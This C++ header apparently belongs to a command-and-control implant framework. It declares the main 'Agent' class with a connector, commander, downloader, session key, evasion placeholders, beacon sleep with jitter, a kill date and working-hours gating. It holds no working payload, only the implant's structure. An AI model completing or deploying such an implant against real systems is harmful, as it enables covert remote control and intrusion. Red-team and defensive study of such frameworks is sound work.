// __NAME__ Agent — Main Agent Class
//
// Orchestrates all agent components: config, connector, commander,
// jobs controller, downloader, crypto, and evasion gate.

#pragma once

#ifdef _WIN32
#include <winsock2.h>
#endif
#include <windows.h>

// Forward declarations
class Commander;
class Connector;
class JobsController;
class Downloader;
// __EVASION_FORWARD_DECL__

class Agent
{
public:
    Commander*      commander  = nullptr;
    Connector*      connector  = nullptr;
    JobsController* jobs       = nullptr;
    Downloader*     downloader = nullptr;

    BYTE*   sessionKey = nullptr;
    BOOL    active     = TRUE;

    ULONG   sleepMs   = 5000;
    ULONG   jitter    = 0;       // 0–90 %
    INT64   killDate  = 0;       // unix timestamp; 0 = disabled
    int     workStart = 0;       // HHMM e.g. 900
    int     workEnd   = 0;       // HHMM e.g. 1700

    // __EVASION_MEMBER__

    Agent();
    ~Agent();

    // Main agent loop: connect, register, process tasks, sleep, repeat.
    // Protocol overlay may provide a complete replacement.
    void Run(void* profile, ULONG profileSize);

    BOOL  IsActive();
    BYTE* BuildBeat(ULONG* size);

    // Utility methods — pure logic, no OS-API calls.
    void SleepWithJitter();
    BOOL ShouldExit();
    void WaitForWorkingHours();
};
